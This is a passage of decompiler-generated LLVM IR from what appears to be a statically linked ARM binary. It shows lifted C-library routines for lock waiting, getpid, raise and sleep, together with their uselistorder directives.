  br i1 %v2_146f411, label %dec_label_pc_146fc, label %dec_label_pc_14668

dec_label_pc_146fc:                               ; preds = %dec_label_pc_146f0, %dec_label_pc_146f4thread-pre-split
  %v0_146fc.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_146fc.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_146fc.pre

; uselistorder directives
  uselistorder i32 %v0_146f4.pr, { 1, 0 }
  uselistorder i32 %v3_146f0, { 1, 2, 0 }
  uselistorder i32 %v1_146b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_146b4, { 1, 0, 2 }
  uselistorder i32 %v1_14698.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14638, { 1, 0, 2 }
  uselistorder i32 %v1_1461c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1460c, { 1, 0 }
  uselistorder i32 %v0_144b0, { 1, 0, 2 }
  uselistorder i32 %v1_14494.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_1446c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14444, { 1, 0, 2 }
  uselistorder i32 %v1_14428.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_143f0, { 1, 0, 2 }
  uselistorder i32 %v0_143d0, { 1, 0, 2 }
  uselistorder i32 %v1_143b4.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 33, 4, 5, 7, 6, 3, 8, 9, 10, 11, 13, 12, 0, 14, 15, 16, 17, 18, 19, 20, 22, 21, 2, 23, 24, 25, 27, 26, 34, 28, 29, 31, 30, 1, 32 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 12, 6, 7, 8, 10, 9, 5, 11, 13, 14, 16, 15, 2, 17, 18, 20, 19, 3, 21, 22, 23, 31, 32, 24, 25, 26, 28, 27, 4, 30, 29, 0 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_146fc, { 1, 0 }
  uselistorder label %dec_label_pc_146f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_146b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_146a0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_1463c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14624, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_144b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1449c, { 1, 0 }
  uselistorder label %dec_label_pc_14448, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14430, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_143d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_143bc, { 1, 0 }
  uselistorder label %dec_label_pc_14458.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14388, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14734 = load i32, i32* @r4, align 4
  store i32 %v3_14734, i32* %stack_var_-16, align 4
  %v0_14738 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14738, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1473c

dec_label_pc_1473c:                               ; preds = %dec_label_pc_147bc.dec_label_pc_1473c_crit_edge, %entry
  %v0_14740 = phi i32 [ %v0_14740.pre, %dec_label_pc_147bc.dec_label_pc_1473c_crit_edge ], [ %v0_14738, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_14740, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1474817 = inttoptr i32 %v0_14740 to i32*
  %v2_1474818 = load i32, i32* %v1_1474817, align 4
  %v3_1474c20 = icmp ne i32 %v2_1474818, 0
  store i1 %v3_1474c20, i1* %cpsr_c.global-to-local, align 1
  %v9_1474c26 = icmp eq i32 %v2_1474818, 1
  br i1 %v9_1474c26, label %dec_label_pc_14754, label %dec_label_pc_1476c

dec_label_pc_14754:                               ; preds = %dec_label_pc_1473c, %dec_label_pc_14754.dec_label_pc_14748_crit_edge
  %v0_1475427 = phi i32 [ %v1_1474c.pre, %dec_label_pc_14754.dec_label_pc_14748_crit_edge ], [ 1, %dec_label_pc_1473c ]
  store i32 %v0_1475427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14764 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14764, label %dec_label_pc_14768, label %dec_label_pc_14754.dec_label_pc_14748_crit_edge

dec_label_pc_14754.dec_label_pc_14748_crit_edge:  ; preds = %dec_label_pc_14754
  %v0_14748.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1474c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14748 = inttoptr i32 %v0_14748.pre to i32*
  %v2_14748 = load i32, i32* %v1_14748, align 4
  %v3_1474c = icmp uge i32 %v2_14748, %v1_1474c.pre
  store i1 %v3_1474c, i1* %cpsr_c.global-to-local, align 1
  %v9_1474c = icmp eq i32 %v2_14748, %v1_1474c.pre
  br i1 %v9_1474c, label %dec_label_pc_14754, label %dec_label_pc_1476c

dec_label_pc_14768:                               ; preds = %dec_label_pc_14754
  %v0_14768 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_1473c, %dec_label_pc_14754.dec_label_pc_14748_crit_edge, %dec_label_pc_14768
  %v0_1476c = phi i32 [ %v0_14768, %dec_label_pc_14768 ], [ %v2_1474818, %dec_label_pc_1473c ], [ %v2_14748, %dec_label_pc_14754.dec_label_pc_14748_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1476c = icmp eq i32 %v0_1476c, 0
  %v0_14790.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1476c, label %dec_label_pc_1478c, label %dec_label_pc_14774

dec_label_pc_14774:                               ; preds = %dec_label_pc_1476c
  store i32 %v0_14790.pre, i32* %r0.global-to-local, align 4
  %v0_14778 = load i32, i32* %r1.global-to-local, align 4
  %v1_14778 = add i32 %v0_14778, 126
  store i32 %v1_14778, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %dec_label_pc_1476c, %dec_label_pc_14774
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_14790.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1479828 = inttoptr i32 %v0_14790.pre to i32*
  %v2_1479829 = load i32, i32* %v1_1479828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1479c36 = icmp eq i32 %v2_1479829, 0
  br i1 %v9_1479c36, label %dec_label_pc_147a4, label %dec_label_pc_147bc

dec_label_pc_147a4:                               ; preds = %dec_label_pc_1478c, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge
  %v0_147a437 = phi i32 [ %v1_1479c.pre, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge ], [ 0, %dec_label_pc_1478c ]
  store i32 %v0_147a437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_147b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_147b4, label %dec_label_pc_147b8, label %dec_label_pc_147a4.dec_label_pc_14798_crit_edge

dec_label_pc_147a4.dec_label_pc_14798_crit_edge:  ; preds = %dec_label_pc_147a4
  %v0_14798.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1479c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14798 = inttoptr i32 %v0_14798.pre to i32*
  %v2_14798 = load i32, i32* %v1_14798, align 4
  %v3_1479c = icmp uge i32 %v2_14798, %v1_1479c.pre
  store i1 %v3_1479c, i1* %cpsr_c.global-to-local, align 1
  %v9_1479c = icmp eq i32 %v2_14798, %v1_1479c.pre
  br i1 %v9_1479c, label %dec_label_pc_147a4, label %dec_label_pc_147bc

dec_label_pc_147b8:                               ; preds = %dec_label_pc_147a4
  %v0_147b8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %dec_label_pc_1478c, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge, %dec_label_pc_147b8
  %v0_147bc = phi i32 [ %v0_147b8, %dec_label_pc_147b8 ], [ %v2_1479829, %dec_label_pc_1478c ], [ %v2_14798, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge ]
  %v1_147bc = phi i32 [ %v0_147b8, %dec_label_pc_147b8 ], [ 0, %dec_label_pc_1478c ], [ %v1_1479c.pre, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge ]
  %v3_147bc = icmp uge i32 %v0_147bc, %v1_147bc
  store i1 %v3_147bc, i1* %cpsr_c.global-to-local, align 1
  %v9_147bc = icmp eq i32 %v0_147bc, %v1_147bc
  br i1 %v9_147bc, label %dec_label_pc_147c4, label %dec_label_pc_147bc.dec_label_pc_1473c_crit_edge

dec_label_pc_147bc.dec_label_pc_1473c_crit_edge:  ; preds = %dec_label_pc_147bc
  %v0_14740.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1473c

dec_label_pc_147c4:                               ; preds = %dec_label_pc_147bc
  %v2_147c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_147c4, i32* %r4.global-to-local, align 4
  %v1_147c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_147c8

; uselistorder directives
  uselistorder i32 %v0_147b8, { 1, 0 }
  uselistorder i32 %v1_1479c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1474c.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1474818, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147a4, { 1, 0 }
  uselistorder label %dec_label_pc_1478c, { 1, 0 }
  uselistorder label %dec_label_pc_1476c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14754, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_147cc = load i32, i32* @r7, align 4
  store i32 %v3_147cc, i32* %stack_var_-8, align 4
  %v0_147d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_147d0, i32* %r0.global-to-local, align 4
  %v1_147d4 = add i32 %v0_147d0, -1060
  %v2_147d4 = inttoptr i32 %v1_147d4 to i32*
  %v3_147d4 = load i32, i32* %v2_147d4, align 4
  %tmp7 = icmp slt i32 %v3_147d4, 1
  br i1 %tmp7, label %dec_label_pc_147e4, label %dec_label_pc_14808

dec_label_pc_147e4:                               ; preds = %entry
  %v2_147d8 = icmp eq i32 %v3_147d4, 0
  br i1 %v2_147d8, label %dec_label_pc_147e8, label %dec_label_pc_147f4

dec_label_pc_147e8:                               ; preds = %dec_label_pc_147e4
  %v1_147e8 = add i32 %v0_147d0, -1064
  %v2_147e8 = inttoptr i32 %v1_147e8 to i32*
  %v3_147e8 = load i32, i32* %v2_147e8, align 4
  store i32 %v3_147e8, i32* %r0.global-to-local, align 4
  %v2_147ec = icmp eq i32 %v3_147e8, 0
  br i1 %v2_147ec, label %bb, label %bb8

dec_label_pc_147f4:                               ; preds = %dec_label_pc_147e4
  br label %bb8

bb:                                               ; preds = %dec_label_pc_147e8
  store i32 0, i32* %v2_147e8, align 4
  %v0_14804.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_147f4, %dec_label_pc_147e8, %bb
  %v0_14804 = phi i32 [ %v3_147e8, %dec_label_pc_147e8 ], [ %v0_147d0, %dec_label_pc_147f4 ], [ %v0_14804.pre, %bb ]
  br label %dec_label_pc_14808

dec_label_pc_14808:                               ; preds = %entry, %bb8
  %v0_14808 = phi i32 [ %v3_147d4, %entry ], [ %v0_14804, %bb8 ]
  store i32 %v0_14808, i32* %r0.global-to-local, align 4
  %v2_1480c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1480c, i32* @r7, align 4
  ret i32 %v0_14808

; uselistorder directives
  uselistorder i32 %v0_14808, { 1, 0 }
  uselistorder i32 %v3_147d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14808, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14814 = load i32, i32* @r4, align 4
  store i32 %v3_14814, i32* %stack_var_-20, align 4
  %v0_1481c = call i32 @__aeabi_read_tp()
  store i32 %v0_1481c, i32* %r0.global-to-local, align 4
  %v1_14820 = add i32 %v0_1481c, -1064
  %v2_14820 = inttoptr i32 %v1_14820 to i32*
  %v3_14820 = load i32, i32* %v2_14820, align 4
  store i32 %v3_14820, i32* %r4.global-to-local, align 4
  %v2_14824 = icmp eq i32 %v3_14820, 0
  %v1_1482c = add i32 %v0_1481c, -1060
  %v2_1482c = inttoptr i32 %v1_1482c to i32*
  %v3_1482c = load i32, i32* %v2_1482c, align 4
  store i32 %v3_1482c, i32* %r0.global-to-local, align 4
  br i1 %v2_14824, label %dec_label_pc_14834, label %dec_label_pc_14848

dec_label_pc_14834:                               ; preds = %entry
  store i32 %v3_1482c, i32* %r4.global-to-local, align 4
  store i32 %v3_1482c, i32* %v2_14820, align 4
  %v0_14870.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_14848:                               ; preds = %entry
  %v5_1484c = icmp sgt i32 %v3_1482c, 0
  br i1 %v5_1484c, label %bb28, label %dec_label_pc_14850

dec_label_pc_14850:                               ; preds = %dec_label_pc_14848
  %tmp = bitcast i32 %v3_1482c to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_14850 = bitcast float %tmp30 to i32
  %v2_14854 = icmp eq i32 %v1_14850, 0
  br i1 %v2_14854, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14850
  store i32 %v3_14820, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_14850
  %v2_1485c = sub i32 0, %v3_1482c
  store i32 %v2_1485c, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_14848, %dec_label_pc_14834, %.thread
  %v0_14874 = phi i32 [ %v3_1482c, %dec_label_pc_14848 ], [ %v0_14870.pre, %dec_label_pc_14834 ], [ %v3_14820, %bb ], [ %v2_1485c, %.thread ]
  store i32 %v0_14874, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_14874, -4095
  br i1 %tmp31, label %dec_label_pc_14898, label %dec_label_pc_14880

dec_label_pc_14880:                               ; preds = %bb28
  %v0_14884 = call i32 @__aeabi_read_tp()
  %v3_14888 = load i16, i16* @global_var_2222c.358, align 2
  %v4_14888 = sext i16 %v3_14888 to i32
  %v0_1488c = load i32, i32* %r2.global-to-local, align 4
  %v1_1488c = sub i32 0, %v0_1488c
  store i32 %v1_1488c, i32* %r2.global-to-local, align 4
  %v3_14890 = add i32 %v4_14888, %v0_14884
  %v4_14890 = inttoptr i32 %v3_14890 to i32*
  store i32 %v1_1488c, i32* %v4_14890, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14898

dec_label_pc_14898:                               ; preds = %bb28, %dec_label_pc_14880
  %v0_1489c = phi i32 [ %v0_14874, %bb28 ], [ -1, %dec_label_pc_14880 ]
  %v3_14898 = icmp eq i32 %v0_1489c, -1
  store i32 %v0_1489c, i32* %r5.global-to-local, align 4
  br i1 %v3_14898, label %dec_label_pc_148a4, label %dec_label_pc_148ec

dec_label_pc_148a4:                               ; preds = %dec_label_pc_14898
  %v0_148a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_148a8, i32* %r0.global-to-local, align 4
  %v3_148ac = load i16, i16* @global_var_2222c.358, align 2
  %v4_148ac = sext i16 %v3_148ac to i32
  %v2_148b0 = add i32 %v4_148ac, %v0_148a8
  %v3_148b0 = inttoptr i32 %v2_148b0 to i32*
  %v4_148b0 = load i32, i32* %v3_148b0, align 4
  %v7_148b4 = icmp eq i32 %v4_148b0, 38
  br i1 %v7_148b4, label %dec_label_pc_148c0, label %dec_label_pc_148a4.dec_label_pc_148ec_crit_edge

dec_label_pc_148a4.dec_label_pc_148ec_crit_edge:  ; preds = %dec_label_pc_148a4
  %v0_148ec.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148ec

dec_label_pc_148c0:                               ; preds = %dec_label_pc_148a4
  %v0_148c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_148c0, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_148c0, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_148c0
  %v5_148d8 = sub i32 0, %v0_148c0
  store i32 %v5_148d8, i32* %r2.global-to-local, align 4
  %v7_148dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_148e4.530 to i32), i32 55624) to i32*), align 4
  %v4_148e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_148e0, i32* %r0.global-to-local, align 4
  %v7_148e4 = add i32 %v7_148dc, %v0_148a8
  %v8_148e4 = inttoptr i32 %v7_148e4 to i32*
  store i32 %v5_148d8, i32* %v8_148e4, align 4
  %v0_148e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_148c0, %bb29
  %v0_148e8 = phi i32 [ %v0_148e8.pre, %bb29 ], [ %v0_148c0, %dec_label_pc_148c0 ]
  store i32 %v0_148e8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148ec

dec_label_pc_148ec:                               ; preds = %dec_label_pc_148a4.dec_label_pc_148ec_crit_edge, %dec_label_pc_14898, %.thread22
  %v0_148ec = phi i32 [ %v0_148ec.pre, %dec_label_pc_148a4.dec_label_pc_148ec_crit_edge ], [ %v0_1489c, %dec_label_pc_14898 ], [ %v0_148e8, %.thread22 ]
  store i32 %v0_148ec, i32* %r0.global-to-local, align 4
  %v2_148f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_148f0, i32* @r4, align 4
  ret i32 %v0_148ec

; uselistorder directives
  uselistorder i32 %v0_148ec, { 1, 0 }
  uselistorder i32 %v0_148c0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14874, { 2, 0, 1 }
  uselistorder i32 %v3_1482c, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_148ec, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_14898, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14904 = load i32, i32* @r4, align 4
  %v6_14904 = load i32, i32* @r5, align 4
  %v9_14904 = load i32, i32* @r6, align 4
  %v12_14904 = load i32, i32* @r7, align 4
  %v15_14904 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14914 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_14914, label %dec_label_pc_14928, label %dec_label_pc_1499c

dec_label_pc_14928:                               ; preds = %entry
  %v0_14928 = call i32 @__aeabi_read_tp()
  %v1_1492c = add i32 %v0_14928, -1036
  %v2_1492c = inttoptr i32 %v1_1492c to i32*
  %v3_1492c = load i32, i32* %v2_1492c, align 4
  %v1_14930 = and i32 %v3_1492c, -71
  %v2_14934 = icmp ugt i32 %v1_14930, 7
  store i1 %v2_14934, i1* %cpsr_c.global-to-local, align 1
  %v7_14934 = icmp eq i32 %v1_14930, 8
  %v1_14938 = add i32 %v0_14928, -1168
  store i32 %v1_14938, i32* @r5, align 4
  br i1 %v7_14934, label %dec_label_pc_14940, label %dec_label_pc_14a14

dec_label_pc_14940:                               ; preds = %dec_label_pc_14928
  %v2_14944 = add i32 %v0_14928, -624
  %v3_14944 = inttoptr i32 %v2_14944 to i32*
  store i32 -1, i32* %v3_14944, align 4
  %v0_14948 = load i32, i32* @r5, align 4
  %v1_14948 = add i32 %v0_14948, 132
  store i32 %v1_14948, i32* @r6, align 4
  br label %dec_label_pc_1494c

dec_label_pc_1494c:                               ; preds = %dec_label_pc_14980.dec_label_pc_1494c_crit_edge, %dec_label_pc_14940
  %v0_14950 = phi i32 [ %v0_14950.pre, %dec_label_pc_14980.dec_label_pc_1494c_crit_edge ], [ %v1_14948, %dec_label_pc_14940 ]
  %v0_1494c = phi i32 [ %v0_14988, %dec_label_pc_14980.dec_label_pc_1494c_crit_edge ], [ %v0_14948, %dec_label_pc_14940 ]
  %v1_1494c = add i32 %v0_1494c, 132
  %v2_1494c = inttoptr i32 %v1_1494c to i32*
  %v3_1494c = load i32, i32* %v2_1494c, align 4
  store i32 %v0_14950, i32* %r2.global-to-local, align 4
  store i32 %v3_1494c, i32* @r4, align 4
  %v1_1495c30 = inttoptr i32 %v0_14950 to i32*
  %v2_1495c31 = load i32, i32* %v1_1495c30, align 4
  %v3_1496033 = icmp uge i32 %v2_1495c31, %v3_1494c
  store i1 %v3_1496033, i1* %cpsr_c.global-to-local, align 1
  %v9_1496039 = icmp eq i32 %v2_1495c31, %v3_1494c
  br i1 %v9_1496039, label %dec_label_pc_14968, label %dec_label_pc_14980

dec_label_pc_14968:                               ; preds = %dec_label_pc_1494c, %dec_label_pc_14968.dec_label_pc_1495c_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14978 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14978, label %dec_label_pc_1497c, label %dec_label_pc_14968.dec_label_pc_1495c_crit_edge

dec_label_pc_14968.dec_label_pc_1495c_crit_edge:  ; preds = %dec_label_pc_14968
  %v0_1495c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14960.pre = load i32, i32* @r4, align 4
  %v1_1495c = inttoptr i32 %v0_1495c.pre to i32*
  %v2_1495c = load i32, i32* %v1_1495c, align 4
  %v3_14960 = icmp uge i32 %v2_1495c, %v1_14960.pre
  store i1 %v3_14960, i1* %cpsr_c.global-to-local, align 1
  %v9_14960 = icmp eq i32 %v2_1495c, %v1_14960.pre
  br i1 %v9_14960, label %dec_label_pc_14968, label %dec_label_pc_14980

dec_label_pc_1497c:                               ; preds = %dec_label_pc_14968
  %v0_1497c = load i32, i32* @r4, align 4
  br label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_1494c, %dec_label_pc_14968.dec_label_pc_1495c_crit_edge, %dec_label_pc_1497c
  %v0_14980 = phi i32 [ %v0_1497c, %dec_label_pc_1497c ], [ %v2_1495c31, %dec_label_pc_1494c ], [ %v2_1495c, %dec_label_pc_14968.dec_label_pc_1495c_crit_edge ]
  %v1_14980 = phi i32 [ %v0_1497c, %dec_label_pc_1497c ], [ %v3_1494c, %dec_label_pc_1494c ], [ %v1_14960.pre, %dec_label_pc_14968.dec_label_pc_1495c_crit_edge ]
  %v3_14980 = icmp uge i32 %v0_14980, %v1_14980
  store i1 %v3_14980, i1* %cpsr_c.global-to-local, align 1
  %v9_14980 = icmp eq i32 %v0_14980, %v1_14980
  br i1 %v9_14980, label %dec_label_pc_14988, label %dec_label_pc_14980.dec_label_pc_1494c_crit_edge

dec_label_pc_14980.dec_label_pc_1494c_crit_edge:  ; preds = %dec_label_pc_14980
  %v0_14988 = load i32, i32* @r5, align 4
  %v0_14950.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1494c

dec_label_pc_14988:                               ; preds = %dec_label_pc_14980
  %v0_14990 = load i32, i32* @r7, align 4
  %v2_14990 = add i32 %v0_14990, 116
  %v3_14990 = inttoptr i32 %v2_14990 to i32*
  %v4_14990 = load i32, i32* %v3_14990, align 4
  store i32 84380, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14990)
  %v0_149a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %entry, %dec_label_pc_14988
  %v0_149a4 = phi i32 [ 0, %entry ], [ %v0_149a4.pre, %dec_label_pc_14988 ]
  %v2_149a8 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_149a8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.59 to i32), i32* %stack_var_-40, align 4
  %v3_149b4 = call i32 @__libc_sigaction(i32 17, i32 %v0_149a4, i32 %v2_149a8)
  %v3_149b8 = load i32, i32* %stack_var_-60, align 4
  %v2_149bc = icmp ne i32 %v3_149b8, 0
  store i1 %v2_149bc, i1* %cpsr_c.global-to-local, align 1
  %v7_149bc = icmp eq i32 %v3_149b8, 1
  br i1 %v7_149bc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1499c
  %v3_149c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_149c0, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1499c, %bb
  call void @__pseudo_cond_branch(i1 %v7_149bc, i32 ptrtoint (i32* @global_var_1161c.534 to i32))
  %v2_149d0 = ptrtoint i32* %stack_var_-32 to i32
  %v2_149d8 = call i32 @__libc_nanosleep(i32 %v2_149d0, i32 %v2_149d0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149dc = icmp eq i32 %v2_149d8, 0
  br i1 %v2_149dc, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_149f0 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_149f0, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14a00 = load i32, i32* %stack_var_-40, align 4
  %v1_14a04 = and i32 %v3_14a00, ptrtoint (i32* @global_var_10000.59 to i32)
  store i32 %v1_14a04, i32* %r2.global-to-local, align 4
  %v2_14a04 = icmp eq i32 %v1_14a04, 0
  br i1 %v2_14a04, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_14a0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14a0c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14a04, i32 ptrtoint (i32* @global_var_1161c.534 to i32))
  br label %dec_label_pc_14a14

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14928, %.thread5
  %v0_14a14 = load i32, i32* @r4, align 4
  store i32 %v3_14904, i32* @r4, align 4
  store i32 %v6_14904, i32* @r5, align 4
  store i32 %v9_14904, i32* @r6, align 4
  store i32 %v12_14904, i32* @r7, align 4
  store i32 %v15_14904, i32* @lr, align 4
  ret i32 %v0_14a14

; uselistorder directives
  uselistorder i32 %v0_1497c, { 1, 0 }
  uselistorder i32 %v1_14960.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
